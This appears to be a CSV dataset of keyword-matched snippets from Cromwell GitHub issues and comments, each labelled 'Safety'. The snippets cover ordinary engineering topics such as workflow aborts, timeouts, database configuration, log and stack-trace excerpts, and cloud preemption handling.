Safety,WorkflowActor should abort workflow's execution before escalating failure to WorkflowManagerActor when one of it's child actors crashed [BA-6071],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5253:21,abort,abort,21,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5253,1,['abort'],['abort']
Safety,WorkflowExecutionActor: Implement abort,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/762:34,abort,abort,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/762,1,['abort'],['abort']
Safety,"WorkflowStoreActor stopped; [2018-09-14 13:20:05,36] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-09-14 13:20:05,39] [info] JobExecutionTokenDispenser stopped; [2018-09-14 13:20:05,40] [info] WorkflowLogCopyRouter stopped; [2018-09-14 13:20:05,40] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-09-14 13:20:05,40] [info] WorkflowManagerActor All workflows finished; [2018-09-14 13:20:05,40] [info] WorkflowManagerActor stopped; [2018-09-14 13:20:05,40] [info] Connection pools shut down; [2018-09-14 13:20:05,41] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-09-14 13:20:05,41] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-09-14 13:20:05,41] [info] SubWorkflowStoreActor stopped; [2018-09-14 13:20:05,41] [info] Shutting down CallCacheWriteActor - Timeout = 1800 seconds; [2018-09-14 13:20:05,41] [info] Shutting down ServiceRegistryActor - Timeout = 1800 seconds; [2018-09-14 13:20:05,42] [info] Shutting down DockerHashActor - Timeout = 1800 seconds; [2018-09-14 13:20:05,42] [info] JobStoreActor stopped; [2018-09-14 13:20:05,42] [info] Shutting down IoProxy - Timeout = 1800 seconds; [2018-09-14 13:20:05,42] [info] CallCacheWriteActor Shutting down: 0 queued messages to process; [2018-09-14 13:20:05,42] [info] WriteMetadataActor Shutting down: 0 queued messages to process; [2018-09-14 13:20:05,43] [info] CallCacheWriteActor stopped; [2018-09-14 13:20:05,43] [info] DockerHashActor stopped; [2018-09-14 13:20:05,43] [info] IoProxy stopped; [2018-09-14 13:20:05,43] [info] KvWriteActor Shutting down: 0 queued messages to process; [2018-09-14 13:20:05,43] [info] ServiceRegistryActor stopped; [2018-09-14 13:20:05,47] [info] Database closed; [2018-09-14 13:20:05,47] [info] Stream materializer shut down; [2018-09-14 13:20:05,48] [info] WDL HTTP import resolver closed; Workflow caab4283-a3d4-4966-85ba-56d0992c8f00 transitioned to state Failed; (p3cwl) [jeremiah@localhost ~]$ ; ```.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:9552,Timeout,Timeout,9552,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,2,['Timeout'],['Timeout']
Safety,Workflows occasionally fail due to timeouts on read_* functions,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057:35,timeout,timeouts,35,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057,1,['timeout'],['timeouts']
Safety,Wrap ask errors from WSCWA to avoid ClassCastException.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3826:30,avoid,avoid,30,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3826,2,['avoid'],['avoid']
Safety,"Write (and run) a bash script for sending the abort, wait, and check the ~~response~~ job has actually aborted.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2088:46,abort,abort,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2088,2,['abort'],"['abort', 'aborted']"
Safety,"WriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:24,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:25,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:26,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:27,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:28,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:29,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:30,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:31,53] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoogleCl",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:9867,abort,abort,9867,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"WriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:31,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:32,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:33,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:34,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:35,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:36,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:37,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:38,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:39,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:40,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:41,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:42,05] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.Abstrac",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:12106,abort,abort,12106,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"WriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:57,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:58,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:59,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:00,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:01,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:02,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:03,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:04,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:05,57] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.jav",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:19170,abort,abort,19170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"WriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:05,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:06,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:07,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:08,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:09,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:10,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:11,95] [info] Waiting for 1 workflows to abort...; Killed; lichtens@lichtens-big:~/test_eval$ [2016-10-27 13:11:12,80] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:21478,abort,abort,21478,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,"Y_CACHEDIR variable is set. If not use a default; # based on the users home.; export SINGULARITY_CACHEDIR=/scratch/$USER/.singularity/cache; export SINGULARITY_LOCALCACHEDIR=/scratch/$USER/.singularity/localcache; export SINGULARITY_TMPDIR=/scratch/$USER/.singularity/tmp; mkdir -p $SINGULARITY_CACHEDIR; mkdir -p $SINGULARITY_LOCALCACHEDIR; mkdir -p $SINGULARITY_TMPDIR; export SINGULARITY_BINDPATH=input_data/hello,$EXECUTION_ROOT:/cromwell-executions,/usr/prog/nx/cromwell/test; # echo ""SINGULARITY_CACHEDIR: $SINGULARITY_CACHEDIR""; # echo ""SINGULARITY_BINDPATH: $SINGULARITY_BINDPATH""; # Make sure cache dir exists so lock file can be created by flock; mkdir -p $SINGULARITY_CACHEDIR; LOCK_FILE=$SINGULARITY_CACHEDIR/singularity_pull_flock; # Create an exclusive filelock with flock. --verbose is useful for; # for debugging, as is the echo command. These show up in stdout.submit.; flock --exclusive --timeout 900 $LOCK_FILE \; singularity exec --containall docker://python@sha256:d03b690584424b88488e555e26820e458cc624e9d004e3fa0fe3ff99aa81b2b4 echo ""Success pulling docker!""; echo ""module load singularity/v3.5.2 && singularity exec --containall --bind cromwell-executions/hello/45d03417-24b0-4f91-a3a2-1f3fa945e36c/call-say_hello:/cromwell-executions/hello/45d03417-24b0-4f91-a3a2-1f3fa945e36c/call-say_hello \; \; docker://python@sha256:d03b690584424b88488e555e26820e458cc624e9d004e3fa0fe3ff99aa81b2b4 /bin/bash /cromwell-executions/hello/45d03417-24b0-4f91-a3a2-1f3fa945e36c/call-say_hello/execution/script"" | qsub \; -terse \; -b n \; -N cromwell_45d03417_say_hello \; -wd cromwell-executions/hello/45d03417-24b0-4f91-a3a2-1f3fa945e36c/call-say_hello \; -o cromwell-executions/hello/45d03417-24b0-4f91-a3a2-1f3fa945e36c/call-say_hello/execution/stdout \; -e cromwell-executions/hello/45d03417-24b0-4f91-a3a2-1f3fa945e36c/call-say_hello/execution/stderr \; \; -l m_mem_free=$(expr 4096 / 1)m \; -l h_rt=3600 \; -l s_rt=3600 \; \; \; \; -V; 2020-10-08 16:09:02,038 cromwell-system-akka.dispat",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5925:8009,timeout,timeout,8009,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5925,1,['timeout'],['timeout']
Safety,Yeah I thought about that too. A config flag might be a good safety net.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161013035:61,safe,safety,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/305#issuecomment-161013035,1,['safe'],['safety']
Safety,"Yeah, my point is, this might also be an instance of circular references not being detected (i.e. we should catch things like `File gvcf = gvcf` regardless of where it appears)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298740549:83,detect,detected,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2226#issuecomment-298740549,1,['detect'],['detected']
Safety,"Yeah, that sounds right to me. I'm not sure how PAPI could improve though, seeing as 4xx errors are generally not retryable. We do have logic in Cromwell to detect certain common pull failures [1], but I'm not sure this one [0] is common enough to merit inclusion as a special case. [0] `We're sorry, but this service is not available in your location`; [1] https://github.com/broadinstitute/cromwell/blob/d142bd4a9b890605a2e61ee6469f01a442dfb74e/supportedBackends/google/pipelines/common/src/main/scala/cromwell/backend/google/pipelines/common/PipelinesApiAsyncBackendJobExecutionActor.scala#L784-L813",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750:157,detect,detect,157,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7132#issuecomment-1563477750,1,['detect'],['detect']
Safety,"Yes that is correct. A future feature could be ""fail immediate"" which would terminate running jobs, but that isn't this one. > On Mar 18, 2016, at 11:55 AM, mcovarr notifications@github.com wrote:; > ; > To be clear, fail-fast should not attempt to abort currently running calls even if those calls might otherwise continue to run for a long time?; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly or view it on GitHub",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198425156:249,abort,abort,249,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/587#issuecomment-198425156,2,['abort'],['abort']
Safety,"Yes this is the default. I'm fine with changing the Swagger, though the delay in abort introduced by the sweep interval here is likely not as significant as the preexisting delay after restart... 🙂",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4401#issuecomment-440047520:81,abort,abort,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4401#issuecomment-440047520,1,['abort'],['abort']
Safety,Yes this pretty much always happens with the recover code I merged to develop yesterday.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1196#issuecomment-235593390:45,recover,recover,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1196#issuecomment-235593390,1,['recover'],['recover']
Safety,"Yes we can update the database manually but I hesitate to do that unless it's really serious. Since this specific ticket is not about aborts, should this be moved to a ticket about aborts?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334867019:134,abort,aborts,134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334867019,2,['abort'],['aborts']
Safety,"Yesterday there was a config change that targeted the /stats endpoint rather than /status to assess Cromwell vitality. Unfortunately this accidentally seems to have DOSed Cromwell and produced tons of messages like the following in the logs. Cromwell effectively locked up and needed a hard restart to recover. I don't think the rate at which /stats was called was excessively high. The counting mechanism is apparently sending messages around to the whole graph of execution actors when it seems like a more efficient means of answering the stats question should be possible. Even if turns out a more efficient calculation isn't possible, the current system doesn't appear to be taking sub workflow actors into account correctly and I don't even know how the MWDA and WIA got caught up in this. ```; WARN c.e.w.l.e.SubWorkflowExecutionActor - unhandled event JobCountQuery in state SubWorkflowRunningState; ```. ```; WARN c.e.w.l.m.MaterializeWorkflowDescriptorActor - MaterializeWorkflowDescriptorActor [UUID(XXXXX)]: received an unhandled message Event(JobCountQuery,()) in state MaterializingState; ```. ```; WARN c.e.w.l.i.WorkflowInitializationActor - WorkflowInitializationActor-XXXXX [UUID(XXXXX)]: received an unhandled message: Event(JobCountQuery,WorkflowLifecycleActorData(Set(Actor[XXXXX]),List(),Map(),List())); ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3683:302,recover,recover,302,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3683,1,['recover'],['recover']
Safety,"You can now supply `meta` blocks at a workflow level, and those can contain outputs as well as inputs so I think I can safely close this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1131#issuecomment-276483565:119,safe,safely,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1131#issuecomment-276483565,1,['safe'],['safely']
Safety,"You're right for the fail-fast, now only files that are actually referenced in a call as an input will be checked, and only at the call run-time. Basically workflow file inputs are just ""global input references"" that can be used to provide inputs for the calls and avoid having duplicates in the workflowinputs.json.; I'm not sure what it changes regarding shell expansions though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151542190:265,avoid,avoid,265,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151542190,1,['avoid'],['avoid']
Safety,"Your DB has become too big. This means it will take too much time to open the database and you will get connection timeouts. (These files can be multiple GBs). Here is our database setup:; ```; database {; profile = ""slick.jdbc.HsqldbProfile$""; db {; driver = ""org.hsqldb.jdbcDriver""; # See http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html; # Shutdown=false. Cromwell will shutdown the database; # hsqlldb.default_table_type=cached. By default hsqldb uses in memory tables. ; # Setting this to cache for improved memory usage.; # hsqldb.result_max_memory_rows=10000 . Limits the amount of rows in memory for temp tables; # hsqldb.tx=mvcc cromwell default. Not changing it. Not clear what this does. http://hsqldb.org/doc/guide/sessions-chapt.html#snc_tx_mvcc; # hsqldb.large_data=true. Cromwell creates huge DBs that need to be opened.; # hsqldb.applog=1. Log errors.; # hsqldb.lob_compressed=true. Compress lobs. This saves a lot of space.; # hsqldb.script_format=3. Compress script. (uses gzip internally).; url = """"""; jdbc:hsqldb:file:cromwell-executions/cromwell-db/cromwell-db;; shutdown=false;; hsqldb.default_table_type=cached;hsqldb.tx=mvcc;; hsqldb.result_max_memory_rows=10000;; hsqldb.large_data=true;; hsqldb.applog=1;; hsqldb.lob_compressed=true;; hsqldb.script_format=3; """"""; # Override the cromwell default of only 3 seconds (3000 milliseconds) and allow for 300s to read the database file.; connectionTimeout = 300000; numThreads = 1; }; }; ```; Please note the `connectionTimeout = 300000` where we set the connection timeout to 5 minutes. This works for most cases. On a side note: HSQLDB has got to be the worst performing embedded database designed in the history of mankind. When running a decent-sized WDL workflow it can get 30 GB in memory! When using the file-based database it still needs 2 GB in memory (on top of the 1 GB that cromwell needs) is very slow, and creates a multiple GB file database. (EDIT: I checked my multiple run 100 sample RNA-seq pipeline that ha",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757:115,timeout,timeouts,115,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5271#issuecomment-624458757,2,['timeout'],['timeouts']
Safety,[30_hotfix] Abort sub workflows,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3261:12,Abort,Abort,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3261,1,['Abort'],['Abort']
Safety,"[40 hotfix] Safety net against long running ""log an event"" actions",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4954:12,Safe,Safety,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4954,1,['Safe'],['Safety']
Safety,[41 hotfix] Customizable PAPI request timeouts,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4993:38,timeout,timeouts,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4993,1,['timeout'],['timeouts']
Safety,[51 Hotfix] .trim() Docker image names to avoid pathological re behavior [BA-6478],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5547:42,avoid,avoid,42,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5547,1,['avoid'],['avoid']
Safety,[53 hotfix] GCS IO safety and test bucket size calls [BW-411],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5997:19,safe,safety,19,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5997,1,['safe'],['safety']
Safety,[53_hotfix] Call-by-name to avoid instantiating default commands if unused [BW-416],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5990:28,avoid,avoid,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5990,1,['avoid'],['avoid']
Safety,[55 Hotfix] Add Trivy github action and remediate [BW-493],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6163:40,remediat,remediate,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6163,1,['remediat'],['remediate']
Safety,[BT-597] use StorageException.getReason to detect requester pays,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6726:43,detect,detect,43,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6726,1,['detect'],['detect']
Safety,[HtCondor] Add recovery functionality,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1249:15,recover,recovery,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1249,1,['recover'],['recovery']
Safety,"[Jira issue](https://broadworkbench.atlassian.net/browse/BA-5943). Using Cromwell 44 and PAPI v2, occasionally machines in GCE are preempted but not handled as such. Metadata snippet:. ```; ""failures"": [; {; ""causedBy"": [],; ""message"": ""Task test_combine.combine:NA:1 failed. The job was stopped before the command finished. PAPI error code 10. The assigned worker has failed to complete the operation""; }; ],; ""jobId"": ""projects/finngen-refinery-dev/operations/18318369325465658337"",; ""backend"": ""PAPIv2"",; ""end"": ""2019-08-20T14:54:37.214Z"",; ```. Stackdriver log snippet:. ```; {; ""insertId"": ""15cmu2qg1chkm09"",; ""jsonPayload"": {; ""event_timestamp_us"": ""1566312261571808"",; ""actor"": {; ""user"": ""system""; },; ""resource"": {; ""name"": ""google-pipelines-worker-6eba778d59d69dcfe9189620b91117c5"",; ""type"": ""instance"",; ""zone"": ""europe-west1-b"",; ""id"": ""1966470788939888666""; },; ""trace_id"": ""systemevent-1566312254625-5908d7d8b55f5-68011c08-d6e13e66"",; ""event_type"": ""GCE_OPERATION_DONE"",; ""operation"": {; ""id"": ""1400679280860576170"",; ""name"": ""systemevent-1566312254625-5908d7d8b55f5-68011c08-d6e13e66"",; ""type"": ""operation"",; ""zone"": ""europe-west1-b""; },; ""event_subtype"": ""compute.instances.preempted"",; ""info"": [; {; ""code"": ""STATUS_MESSAGE"",; ""detail_message"": ""Instance was preempted.""; }; ],; ""version"": ""1.2""; },; ```. Although this happens rarely, it causes large workflows to fail and we'd like to avoid rerunning such workflows because at scale other issues may arise with e.g. call caching timeouts, and things are more manageable without otherwise unnecessary reruns. Any help would be much appreciated!",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5136:1404,avoid,avoid,1404,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5136,2,"['avoid', 'timeout']","['avoid', 'timeouts']"
Safety,"[Per @mbookman]; This pull request is an initial update to address:. CROM-6718: FR: Add flag for minimizing chance of GCP cross-region network egress charges being incurred. This PR specifically focuses on the risks of egress charges incurred due to call caching. The framing of the approach here, which is a bit broader than originally noted in CROM-6718, is:; Make call caching location-aware, prioritizing copies that minimize egress charges.; Add a workflow option enabling control of what egress charges can be incurred for call cache copying.; The new workflow option would be:. call_cache_egress: [none, continental, global]. where the values affect whether call cache copies can incur egress charges:; none: only within-region copies are allowed, which generate no egress charges; continental: within content copies are allowed; within-content copies have reduced costs, such as $0.01 / GB in the US; global: copies across all regions are allowed. Cross-content egress charges can be much higher (ranging from $0.08 / GB up to $0.23 / GB). ### CURRENT STATUS OF PR:; These first few commits are a WIP/request for feedback. I would love discussion on what the best approach would be. The idea for this initial approach is to raise an exception right before copying cached outputs if the bucket locations would cause an egress charge (depending on workflow option). The CallCacheJobActor continue attempting to copy outputs until it finds one that doesn't cause an egress charge (depending on workflow option), or until it determines cache miss. . If the above approach is reasonable then I would need coding advice on:; 1) How do I properly use GcsBatchCommandBuilder.locationCommand (or something similar) in the CacheHitCopyingActor?; 2) How do I properly get the WorkflowOption CallCacheEgress in the CacheHitCopyingActor?",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6324:210,risk,risks,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6324,1,['risk'],['risks']
Safety,"[The ticket](https://broadworkbench.atlassian.net/browse/DDO-2190) has a ton more info and I talked with @aednichols about this--the short version is:; - Whatever is doing the HTTP request to Cromwell (Akka?) does not set the Host header ([per MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Host)) if it has been customized beforehand; - We've accidentally been doing that by copying the _request's_ headers that came into CromIAM, which obviously include the Host header correlating to CromIAM itself; - Thus CromIAM sends requests to Cromwell with an incorrect Host header; - This hasn't mattered before because Cromwell's Layer 4 load balancer doesn't care and Cromwell's Apache proxy didn't actually need to do host-based routing because it just forwards everything to one app, Cromwell; - This suddenly matters a lot now because BEEs use an Nginx controller for ingress instead of a GCP Layer 4 load balancer, and _it_ needs to use host-based routing; - TL;DR: CromIAM is proxying to Cromwell wrong-ish and it very much does not work in BEEs. Solution: strip out the Host header just like CromIAM already does for Timeout-Access, and everything is happy. The impact to live environments should be zero because they clearly didn't care about the header before. If this fails anywhere, Argo sees the failure immediately like it did for BEEs, and it sees it in a way that any deployment or promotion would be halted because CromIAM would fail to come online from Argo's 